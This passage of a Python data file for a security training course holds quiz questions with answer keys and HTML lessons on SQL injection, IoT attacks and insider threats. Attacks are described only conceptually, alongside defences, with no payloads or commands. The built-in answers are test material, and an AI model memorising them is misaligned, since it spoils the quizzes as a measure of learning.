     "Use its raw-string query feature for everything",
     "Concatenate user input into ORM raw SQL",
     "Disable its escaping",
     "Use its parameterized query methods rather than building raw SQL",
     "D",
     "ORMs are safe when their parameterized APIs are used; raw concatenated SQL reintroduces the risk."),
    ("Which input would you most expect an allow-list validator to reject for a numeric ID field?",
     "Text containing SQL keywords and quotes",
     "12345",
     "0",
     "99",
     "A",
     "An allow-list for a numeric field should reject non-numeric input such as SQL keywords and quote characters."),
    ("The OWASP category historically covering SQLi groups it under:",
     "Cryptographic failures",
     "Injection",
     "Security misconfiguration",
     "Broken authentication",
     "B",
     "SQL injection falls under the broader Injection category of common web application risks."),
    ("Time-based blind SQLi infers data by:",
     "Reading the page title",
     "Decrypting cookies",
     "Observing how long the server takes to respond to conditional queries",
     "Counting open ports",
     "C",
     "By making the database delay on a true condition, attackers infer data from response timing."),
    ("Stored procedures help against SQLi only if they:",
     "Build dynamic SQL from concatenated input",
     "Disable logging",
     "Run as the database owner",
     "Use parameters and avoid unsafe dynamic SQL construction",
     "D",
     "Stored procedures are not automatically safe; they must avoid concatenated dynamic SQL and use parameters."),
    ("Which is the BEST example of secure data access?",
     "Placeholder/bind parameters supplied separately from the query text",
     "f-string interpolation of user input into SQL",
     "Manually escaping quotes by hand",
     "Trusting the client to validate",
     "A",
     "Bind parameters keep data separate from the SQL command and are the recommended approach."),
    ("A SameSite=Strict cookie attribute primarily mitigates:",
     "SQL injection",
     "CSRF by limiting when cookies are sent on cross-site requests",
     "Buffer overflow",
     "DNS spoofing",
     "B",
     "SameSite restricts cross-site cookie sending, reducing CSRF risk."),
    ("Out-of-band SQL injection exfiltrates data via:",
     "The same HTTP response",
     "A printed report",
     "A separate channel such as DNS or HTTP requests from the database",
     "The CPU cache",
     "C",
     "Out-of-band techniques move data through alternate channels when in-band output is unavailable."),
    ("Defense in depth for application security means:",
     "Relying on one strong control",
     "Hiding the source code",
     "Only using a firewall",
     "Layering multiple controls so a single failure is not catastrophic",
     "D",
     "Multiple overlapping controls (secure code, validation, least privilege, monitoring) provide resilience."),
    ("If a code reviewer sees user input concatenated into a query string, the correct conclusion is that the code is:",
     "Vulnerable and should be rewritten with parameterized queries",
     "Secure because it is short",
     "Safe if the table is small",
     "Safe if HTTPS is used",
     "A",
     "Concatenating input into SQL is the hallmark of an injectable query and must be refactored to use parameters."),
    ("Which practice best reduces the impact of a successful injection on the database?",
     "Running the app's DB account with full admin rights",
     "Granting the app account only the minimum privileges it needs",
     "Disabling all backups",
     "Storing the password in the query",
     "B",
     "A least-privilege database account limits what an attacker can do even if injection succeeds."),
]


IOT_CONTENT = """
<section>
  <h2>IoT (Internet of Things) Attacks</h2>
  <p>IoT devices - cameras, smart plugs, routers, medical sensors, industrial
  controllers - extend the network to billions of small, often poorly secured
  computers. Many ship with default passwords, rarely receive patches, and have
  little built-in security, making them attractive targets and launch pads.</p>
</section>

<section>
  <h3>1. Why IoT is hard to secure</h3>
  <ul>
    <li><strong>Default or hardcoded credentials</strong> that users never
    change.</li>
    <li><strong>Infrequent or impossible firmware updates,</strong> leaving known
    vulnerabilities unpatched for years.</li>
    <li><strong>Weak or absent encryption</strong> for stored data and network
    traffic.</li>
    <li><strong>Large attack surface</strong> with exposed services and open
    ports reachable from the internet.</li>
    <li><strong>Limited monitoring</strong> - many devices cannot run security
    agents, so compromise goes unnoticed.</li>
  </ul>
</section>

<section>
  <h3>2. How IoT gets attacked</h3>
  <p>The most famous example is the <strong>Mirai botnet</strong>, which scanned
  the internet for devices using factory-default passwords, enslaved hundreds of
  thousands of cameras and routers, and used them to launch record-breaking DDoS
  attacks. Other common patterns:</p>
  <table class="table">
    <thead>
      <tr><th>Attack</th><th>What happens</th></tr>
    </thead>
    <tbody>
      <tr><td>Botnet recruitment</td><td>Devices conscripted for DDoS, spam, or crypto-mining</td></tr>
      <tr><td>Default-credential login</td><td>Attacker logs in with the factory username/password</td></tr>
      <tr><td>Firmware tampering</td><td>Malicious firmware installs persistent backdoors</td></tr>
      <tr><td>Pivot / lateral movement</td><td>A weak device becomes a foothold into the wider network</td></tr>
      <tr><td>Eavesdropping</td><td>Unencrypted traffic exposes video, audio, or sensor data</td></tr>
    </tbody>
  </table>
</section>

<section>
  <h3>3. Real-world red flags</h3>
  <ul>
    <li>A device still using its out-of-the-box username and password.</li>
    <li>Cameras or appliances directly reachable from the public internet.</li>
    <li>Unexpected outbound traffic or scanning behavior from a smart device.</li>
    <li>Firmware that has not been updated in years or is past end-of-life.</li>
  </ul>
</section>

<section>
  <h3>4. Defenses</h3>
  <ul>
    <li><strong>Change default credentials</strong> immediately and use unique,
    strong passwords.</li>
    <li><strong>Segment IoT onto a separate network/VLAN</strong> isolated from
    sensitive systems.</li>
    <li><strong>Keep firmware updated;</strong> retire devices that no longer
    receive patches.</li>
    <li><strong>Disable unused features and close unneeded ports;</strong> do not
    expose devices directly to the internet.</li>
    <li><strong>Monitor IoT traffic</strong> and apply network-level controls
    since the devices often cannot defend themselves.</li>
  </ul>
</section>

<section class="exercise" data-exercise="threat">
  <h3>Select every good practice for securing IoT devices:</h3>
  <div class="exercise-options">
    <label><input type="checkbox" data-answer="creds" data-correct="true"> Change default passwords to unique strong ones</label>
    <label><input type="checkbox" data-answer="segment" data-correct="true"> Put IoT devices on a separate, isolated network segment</label>
    <label><input type="checkbox" data-answer="firmware" data-correct="true"> Keep device firmware updated</label>
    <label><input type="checkbox" data-answer="expose"> Expose cameras directly to the public internet for convenience</label>
    <label><input type="checkbox" data-answer="default"> Leave factory credentials so support can help later</label>
  </div>
  <button type="button" class="btn btn-primary" data-action="check">Check</button>
  <p class="exercise-feedback" hidden></p>
</section>
"""

IOT_QUIZ = [
    ("What does IoT stand for?",
     "Internet of Things",
     "Internet of Threats",
     "Integration of Technology",
     "Internal Office Tools",
     "A",
     "IoT means Internet of Things - networked physical devices such as cameras, sensors, and appliances."),
    ("The single most important first step when deploying a new IoT device is to:",
     "Increase its volume",
     "Change the default/factory password to a unique strong one",
     "Expose it to the internet",
     "Disable its updates",
     "B",
     "Default credentials are a top IoT weakness; changing them immediately closes the easiest attack path."),
    ("The Mirai botnet primarily compromised devices by:",
     "Exploiting a zero-day in firmware",
     "Sending phishing emails",
     "Logging in with factory-default usernames and passwords",
     "Cracking AES encryption",
     "C",
     "Mirai scanned for IoT devices still using default credentials and enslaved them into a DDoS botnet."),
    ("Why are many IoT devices rarely patched?",
     "Patching is illegal",
     "They have no software",
     "Users patch them daily",
     "Limited or no firmware update mechanisms and short vendor support",
     "D",
     "Many IoT products lack easy update mechanisms or fall out of support, leaving known flaws unfixed."),
    ("Network segmentation protects IoT by:",
     "Isolating IoT devices so a compromise cannot easily reach sensitive systems",
     "Making devices faster",
     "Encrypting passwords",
     "Removing the need for updates",
     "A",
     "Placing IoT on a separate VLAN limits lateral movement from a compromised device to critical assets."),
    ("Compromised IoT devices are most commonly used to:",
     "Mine for oil",
     "Form botnets for DDoS, spam, or crypto-mining",
     "Print documents",
     "Speed up Wi-Fi",
     "B",
     "Enslaved IoT devices are pooled into botnets to launch large-scale attacks like DDoS."),
    ("Exposing a home security camera directly to the public internet is:",
     "A best practice",
     "Required for it to work",
     "A serious risk that lets attackers find and attack it",
     "Safe if it is new",
     "C",
     "Internet-exposed devices are easily discovered and targeted; they should sit behind proper network controls."),
    ("Hardcoded credentials in IoT firmware are dangerous because:",
     "They expire automatically",
     "They are encrypted",
     "They improve performance",
     "They cannot be changed by users and are often publicly known",
     "D",
     "Hardcoded passwords are frequently leaked and cannot be altered, giving attackers reliable access."),
    ("A reason IoT devices often cannot run traditional security software is:",
     "Limited processing power, memory, and closed firmware",
     "They are too expensive",
     "They have no power supply",
     "They run only on paper",
     "A",
     "Constrained hardware and closed systems make installing endpoint agents impractical, so network controls matter more."),
    ("Unencrypted IoT traffic can allow attackers to:",
     "Speed up the device",
     "Eavesdrop on video, audio, or sensor data",
     "Patch the firmware",
     "Extend the warranty",
     "B",
     "Without encryption, sensitive IoT data can be intercepted in transit."),
    ("Firmware tampering on an IoT device typically aims to:",
     "Improve battery life",
     "Change the device color",
     "Install a persistent backdoor that survives reboots",
     "Reduce file size",
     "C",
     "Malicious firmware can embed persistent backdoors that remain even after restarts or resets."),
    ("Which is the best policy for an IoT device that no longer receives security updates?",
     "Keep using it indefinitely",
     "Disable its password",
     "Expose it to the internet",
     "Retire or replace it because unpatched flaws accumulate",
     "D",
     "End-of-life devices accumulate unpatched vulnerabilities and should be retired or isolated."),
    ("Disabling unused features and ports on an IoT device:",
     "Reduces the attack surface available to adversaries",
     "Voids all warranties",
     "Makes it slower",
     "Has no security benefit",
     "A",
     "Turning off unneeded services and closing ports shrinks the ways an attacker can reach the device."),
    ("A smart device suddenly scanning other hosts on the network likely indicates:",
     "A normal firmware update",
     "Possible compromise and botnet/worm behavior",
     "Better performance",
     "A stronger password",
     "B",
     "Unexpected scanning is a classic sign that a device has been compromised and is seeking more targets."),
    ("Why does IoT dramatically increase an organization's attack surface?",
     "Devices are large",
     "It removes all servers",
     "It adds many networked, often weakly secured endpoints",
     "It disables the internet",
     "C",
     "Each IoT device is another potentially vulnerable entry point into the network."),
    ("Default credentials such as admin/admin should be:",
     "Kept for convenience",
     "Posted publicly",
     "Shared with everyone",
     "Changed immediately to unique, strong credentials",
     "D",
     "Well-known default credentials are trivially exploited and must be replaced right away."),
    ("Placing IoT devices behind a router/firewall rather than direct internet exposure helps by:",
     "Preventing attackers from directly discovering and reaching them",
     "Improving picture quality",
     "Charging the battery",
     "Encrypting passwords automatically",
     "A",
     "Keeping devices off the public internet removes the easiest path for remote attackers."),
    ("Industrial IoT / OT security is especially critical because compromise can:",
     "Only slow email",
     "Cause physical, safety, or operational consequences",
     "Improve uptime",
     "Reduce costs",
     "B",
     "Attacks on operational technology can disrupt physical processes and endanger safety, not just data."),
    ("Monitoring IoT at the network level is important because:",
     "Devices have huge screens",
     "It increases battery life",
     "Many devices cannot defend themselves, so network visibility detects abuse",
     "It replaces firmware updates",
     "C",
     "Since IoT endpoints often lack security agents, network monitoring is key to spotting compromise."),
    ("Which of these is NOT a recommended IoT security practice?",
     "Changing default passwords",
     "Segmenting IoT onto a separate network",
     "Keeping firmware updated",
     "Leaving devices on factory credentials for support",
     "D",
     "Leaving factory credentials in place is a major vulnerability, not a good practice."),
    ("A unique strong password per IoT device matters because:",
     "It prevents credential reuse from compromising many devices at once",
     "It looks professional",
     "It speeds up boot",
     "It is required by law everywhere",
     "A",
     "Unique credentials limit the blast radius if one password is exposed."),
    ("The large number of devices in IoT botnets makes their DDoS attacks:",
     "Smaller and weaker",
     "Capable of generating massive traffic volumes",
     "Impossible to launch",
     "Easy to ignore",
     "B",
     "The sheer scale of compromised IoT devices enables record-breaking DDoS traffic."),
    ("UPnP exposed on a router can be risky because it may:",
     "Encrypt all traffic",
     "Disable the firewall fan",
     "Automatically open ports that expose internal devices",
     "Improve Wi-Fi range",
     "C",
     "Universal Plug and Play can auto-forward ports, unintentionally exposing internal devices to the internet."),
    ("A foothold attack via IoT means the attacker:",
     "Stands on the device",
     "Updates the firmware",
     "Charges the device",
     "Uses a weak device as an entry point to reach the broader network",
     "D",
     "A compromised IoT device can serve as a pivot point for lateral movement into more valuable systems."),
    ("When buying IoT devices, a security-conscious choice favors vendors that:",
     "Provide regular firmware updates and clear support timelines",
     "Never release updates",
     "Use the same password for all units",
     "Hide their security practices",
     "A",
     "Vendor commitment to updates and support is a key indicator of a device's long-term security."),
    ("Smart-home devices on the same flat network as a work laptop create risk because:",
     "They share electricity",
     "A compromised device could attack or pivot to the laptop",
     "They use more bandwidth",
     "They look cluttered",
     "B",
     "Without segmentation, an infected IoT device can directly target other machines on the network."),
    ("Two-factor authentication on IoT management accounts (where available) helps by:",
     "Speeding up logins",
     "Encrypting the device casing",
     "Adding a second barrier even if the password is stolen",
     "Removing firmware bugs",
     "C",
     "MFA reduces the impact of stolen or guessed credentials on device management portals."),
    ("Many IoT breaches ultimately trace back to:",
     "Overly strong encryption",
     "Network segmentation",
     "Too much monitoring",
     "Basic hygiene failures like default passwords and missing updates",
     "D",
     "Most IoT compromises stem from simple, preventable issues rather than exotic exploits."),
    ("The best overall strategy for IoT security is to:",
     "Apply layered controls: strong credentials, segmentation, updates, and monitoring",
     "Trust devices because they are small",
     "Connect everything directly to the internet",
     "Disable all firewalls",
     "A",
     "Layered, defense-in-depth measures address the many weaknesses inherent in IoT devices."),
    ("A guest or IoT VLAN that cannot reach corporate servers is an example of:",
     "Privilege escalation",
     "Network segmentation reducing lateral movement",
     "A denial-of-service attack",
     "Firmware tampering",
     "B",
     "Isolating IoT on its own VLAN prevents a compromised device from pivoting to sensitive corporate systems."),
]


INSIDER_CONTENT = """
<section>
  <h2>Insider Threats</h2>
  <p>An <strong>insider threat</strong> comes from people who already have
  legitimate access - employees, contractors, or partners - who misuse that
  access, intentionally or by accident. Because insiders are trusted and inside
  the perimeter, their actions can be far harder to detect than an external
  attack.</p>
</section>

<section>
  <h3>1. Types of insider threats</h3>
  <table class="table">
    <thead>
      <tr><th>Type</th><th>Description</th></tr>
    </thead>
    <tbody>
      <tr><td>Malicious insider</td><td>Deliberately steals data, sabotages systems, or commits fraud</td></tr>
      <tr><td>Negligent insider</td><td>Causes harm through carelessness - lost laptop, misdirected email, ignored policy</td></tr>
      <tr><td>Compromised insider</td><td>A legitimate account taken over by an outside attacker</td></tr>
      <tr><td>Third-party / partner</td><td>Vendors or contractors with access who introduce risk</td></tr>
    </tbody>
  </table>
  <p>Notably, the majority of insider incidents are unintentional - mistakes and
  negligence - rather than malice.</p>
</section>

<section>
  <h3>2. Motivations and red flags</h3>
  <ul>
    <li>Financial pressure, grievance after a poor review, or recruitment by an
    outside party.</li>
    <li>Departing employees copying files in their final weeks.</li>
    <li>Accessing data unrelated to one's job, or at unusual hours.</li>
    <li>Large downloads, use of personal cloud storage or USB drives for company
    data.</li>
    <li>Attempts to bypass controls, disable logging, or escalate privileges.</li>
  </ul>
</section>

<section>
  <h3>3. Why insiders are hard to catch</h3>
  <p>Perimeter defenses such as firewalls assume the threat is outside. Insiders
  already hold valid credentials and knowledge of where sensitive data lives, so
  their activity often looks legitimate. Detection depends on understanding
  <em>normal</em> behavior and spotting deviations.</p>
</section>

<section>
  <h3>4. Defenses</h3>
  <ul>
    <li><strong>Least privilege and need-to-know:</strong> grant only the access
    a role requires, and review it regularly.</li>
    <li><strong>Separation of duties:</strong> ensure no single person can
    complete a sensitive transaction alone.</li>
    <li><strong>Robust offboarding:</strong> promptly revoke access when people
    leave or change roles.</li>
    <li><strong>Monitoring and UEBA:</strong> use logging and User and Entity
    Behavior Analytics to flag anomalies; deploy DLP to control data movement.</li>
    <li><strong>Culture and training:</strong> foster a positive environment,
    enforce policy, and make it easy to report concerns.</li>
  </ul>
</section>

<section class="exercise" data-exercise="threat">
  <h3>Select every behavior that could be a red flag of an insider threat:</h3>
  <div class="exercise-options">
    <label><input type="checkbox" data-answer="hours" data-correct="true"> Accessing sensitive files at unusual hours unrelated to one's job</label>
    <label><input type="checkbox" data-answer="copy" data-correct="true"> A departing employee bulk-copying files to personal storage</label>
    <label><input type="checkbox" data-answer="bypass" data-correct="true"> Attempting to disable logging or bypass access controls</label>
    <label><input type="checkbox" data-answer="lunch"> Taking a normal lunch break</label>
    <label><input type="checkbox" data-answer="vacation"> Requesting approved vacation time</label>
  </div>
  <button type="button" class="btn btn-primary" data-action="check">Check</button>
  <p class="exercise-feedback" hidden></p>
</section>
"""

INSIDER_QUIZ = [
    ("What is an insider threat?",
     "A risk from people with legitimate access who misuse it, intentionally or not",
     "An attack from an unknown external hacker",
     "A type of computer virus",
     "A firewall misconfiguration",
     "A",
     "Insider threats come from trusted individuals (employees, contractors, partners) misusing their authorized access."),
    ("Which type of insider causes harm through carelessness rather than malice?",
     "Malicious insider",
     "Negligent insider",
     "External attacker",
     "Nation-state actor",
     "B",
     "A negligent insider unintentionally causes harm, e.g., by losing a device or misdirecting an email."),
    ("Most insider incidents are:",
     "Deliberate sabotage",
     "Caused by nation-states",
     "Unintentional, caused by mistakes or negligence",
     "Impossible to prevent",
     "C",
     "Research consistently shows the majority of insider incidents stem from error and negligence rather than malice."),
    ("A 'compromised insider' refers to:",
     "An employee who quit",
     "A vendor invoice",
     "A new hire",
     "A legitimate account that an external attacker has taken over",
     "D",
     "When attackers hijack a valid account, the resulting activity appears to come from a trusted insider."),
    ("Why are insider threats often harder to detect than external attacks?",
     "Insiders already have valid access and knowledge, so activity looks legitimate",
     "Insiders use louder tools",
     "Firewalls always catch them",
     "They only attack at night",
     "A",
     "Legitimate credentials and familiarity with systems let insider actions blend in with normal work."),
    ("The principle of least privilege helps against insider threats by:",
     "Giving everyone admin rights",
     "Granting only the access a role needs, limiting potential misuse",
     "Removing all access",
     "Encrypting the building",
     "B",
     "Minimizing each person's access reduces what a malicious or compromised insider can reach."),
    ("Separation of duties means:",
     "One person handles everything for speed",
     "Employees never share offices",
     "No single person can complete a sensitive transaction alone",
     "Duties are assigned randomly",
     "C",
     "Splitting critical tasks across people prevents a lone insider from committing fraud unchecked."),
    ("A classic red flag from a departing employee is:",
     "Submitting a resignation letter",
     "Returning a stapler",
     "Attending the farewell lunch",
     "Bulk-copying files to personal storage in their final weeks",
     "D",
     "Mass data copying before departure is a common indicator of data theft."),
    ("Prompt offboarding (revoking access when someone leaves) matters because:",
     "Lingering access can be abused by former staff or attackers",
     "It saves on salaries",
     "It speeds up the network",
     "It is only a courtesy",
     "A",
     "Failing to revoke access leaves accounts that former employees or attackers can exploit."),
    ("UEBA (User and Entity Behavior Analytics) detects insider risk by:",
     "Blocking all logins",
     "Learning normal behavior and flagging anomalies",
     "Encrypting emails",
     "Counting office visits",
     "B",
     "UEBA baselines typical activity and alerts on deviations that may signal insider misuse."),
    ("Data Loss Prevention (DLP) tools help by:",
     "Speeding up downloads",
     "Replacing passwords",
     "Detecting and controlling sensitive data movement, like copying to USB or personal cloud",
     "Encrypting the network cables",
     "C",
     "DLP monitors and restricts how sensitive data is moved, helping stop exfiltration."),
    ("Which is a common motivation for a malicious insider?",
     "A positive performance review",
     "Getting a promotion",
     "Enjoying their job",
     "Financial pressure, grievance, or recruitment by an outside party",
     "D",
     "Money troubles, grievances, and external recruitment are frequent drivers of malicious insider activity."),
    ("Accessing data unrelated to one's job role is a red flag because it may indicate:",
     "Snooping or preparation for data theft",
     "Good productivity",
     "A required task",
     "Normal collaboration",
     "A",
     "Reaching for information outside one's duties can signal reconnaissance or misuse."),
    ("A third-party insider threat comes from:",
     "Only full-time employees",
     "Vendors, contractors, or partners with access to systems or data",
     "Random internet users",
     "Automated bots only",
     "B",
     "Trusted external parties with access can introduce insider-style risk to the organization."),
    ("Which control most directly limits the blast radius of a compromised account?",
     "A faster CPU",
     "A bigger monitor",
     "Least privilege access",
     "More meetings",
     "C",
     "When accounts have minimal privileges, a takeover yields far less access to sensitive resources."),
    ("Attempting to disable logging or bypass access controls is:",
     "Normal maintenance",
     "A performance optimization",
     "Required for backups",
     "A strong warning sign of malicious insider activity",
     "D",
     "Trying to evade monitoring or controls is a serious indicator of intent to misuse access."),
    ("A positive workplace culture reduces insider risk by:",
     "Lowering grievances and encouraging people to report concerns",
     "Removing all security tools",
     "Eliminating the need for policy",
     "Increasing financial pressure",
     "A",
     "A healthy culture reduces motivation for malice and makes employees more willing to report issues."),
    ("Regular access reviews are important because:",
     "Access never needs to change",
     "Permissions accumulate over time and should be re-justified or removed",
     "They slow down work for no reason",
     "They replace passwords",
     "B",
     "Periodic reviews catch 'privilege creep' where users retain access they no longer need."),
    ("Which of the following is NOT an insider-threat red flag on its own?",
     "Bulk downloads to a personal USB drive",
     "Accessing unrelated sensitive data at 3 a.m.",
     "Taking an approved, scheduled vacation",
     "Attempting to escalate privileges",
     "C",
     "Approved vacation is normal; the others are behaviors that warrant attention."),
    ("Privileged users (e.g., admins) deserve extra monitoring because they:",
     "Work shorter hours",
     "Never make mistakes",
     "Cannot be compromised",
     "Hold powerful access that can cause outsized damage if misused",
     "D",
     "Elevated privileges mean an admin insider (or hijacked admin account) can do far more harm."),
    ("A negligent insider scenario is best illustrated by:",
     "Emailing a sensitive spreadsheet to the wrong recipient",
     "Selling data to a competitor",
     "Planting a logic bomb",
     "Recruiting a colleague to steal data",
     "A",
     "Misdirected email is a classic unintentional (negligent) data exposure."),
    ("Mandatory vacations and job rotation can help detect insider fraud by:",
     "Reducing salaries",
     "Forcing tasks into others' hands, surfacing hidden manipulation",
     "Speeding up the network",
     "Eliminating logging",
     "B",
     "When someone else covers a role, ongoing fraudulent schemes can come to light."),
    ("The 'CIA triad' impact of a malicious insider stealing customer data most directly harms:",
     "Availability only",
     "Latency",
     "Confidentiality",
     "Bandwidth",
     "C",
     "Data theft is primarily a breach of confidentiality."),
    ("Encouraging easy, blame-free reporting of mistakes helps because:",
     "It hides incidents",
     "It removes the need for backups",
     "It punishes honesty",
     "Early reporting of errors limits damage and improves response",
     "D",
     "When people feel safe reporting mistakes, incidents are caught and contained sooner."),
    ("Behavioral baselining is valuable against insiders because anomalies stand out only when:",
     "You first understand what normal behavior looks like",
     "You ignore normal activity",
     "You disable all alerts",
     "Everyone shares one account",
     "A",
     "Detecting deviations requires a clear baseline of normal user and system behavior."),
    ("Shared accounts undermine insider-threat defense because they:",
     "Are easier to remember",
     "Destroy accountability by hiding who did what",
     "Improve monitoring",
     "Enforce least privilege",
     "B",
     "Without individual accounts, actions cannot be attributed, crippling investigations."),
    ("A vendor with broad, unmonitored network access represents risk that is best reduced by:",
     "Giving them admin rights",
     "Sharing your password with them",
     "Limiting and monitoring their access to only what is needed",
     "Disabling logging for them",
     "C",
     "Scoping and monitoring third-party access reduces the insider risk they pose."),
    ("Why is an insider-threat program a blend of technical and human measures?",
     "Technology alone catches every case",
     "Policies do not matter",
     "Humans are irrelevant to security",
     "Insider risk involves human motivation and behavior as well as systems",
     "D",
     "Because insiders are people, effective programs combine monitoring and controls with culture, training, and HR processes."),
    ("The most balanced approach to insider threats is to:",
     "Combine least privilege, monitoring, offboarding, and a healthy culture",
     "Treat every employee as a criminal",
     "Rely only on the firewall",
     "Ignore the risk since insiders are trusted",
     "A",
     "A layered program of access control, detection, process, and culture manages insider risk without destroying trust."),
    ("Why should an insider-threat program involve HR and legal, not just IT?",
     "To slow down investigations",
     "Because it touches employee privacy, policy, and fair, lawful handling of cases",
     "Because IT has no role",
     "To avoid using any technology",
     "B",
     "Handling insider cases responsibly requires HR and legal involvement to respect privacy, policy, and due process."),
]


MODULES = [
    {
        "title": "Living-off-the-Land (LotL) Attacks",
        "description": "How attackers abuse legitimate, pre-installed system tools (LOLBins) to operate stealthily, and how behavioral detection and least privilege stop them.",
        "category": "Endpoint Security",
        "order": 17,
        "content": LOTL_CONTENT,
        "questions": LOTL_QUIZ,
    },
    {
        "title": "AI-Powered Attacks & Deepfakes",
        "description": "How generative AI supercharges phishing, voice/video deepfakes, and model attacks - and why verified process beats trusting what you see or hear.",
        "category": "Emerging Threats",
        "order": 18,
        "content": AI_CONTENT,
        "questions": AI_QUIZ,
    },
    {
        "title": "SQL Injection & Application-Layer Attacks",
        "description": "Recognizing and remediating SQL injection and related web flaws (XSS, CSRF, command injection) using the vulnerable-versus-secure pattern.",
        "category": "Application Security",
        "order": 19,
        "content": SQLI_CONTENT,
        "questions": SQLI_QUIZ,
    },
    {
        "title": "IoT (Internet of Things) Attacks",
        "description": "Why IoT devices are easy targets and launch pads for botnets, and how credentials, segmentation, updates, and monitoring secure them.",
        "category": "Network Security",
        "order": 20,
        "content": IOT_CONTENT,
        "questions": IOT_QUIZ,
    },
    {
        "title": "Insider Threats",
        "description": "Malicious, negligent, and compromised insiders, the red flags they show, and the layered controls and culture that mitigate the risk.",
        "category": "Human Risk",
        "order": 21,
        "content": INSIDER_CONTENT,
        "questions": INSIDER_QUIZ,
    },
]
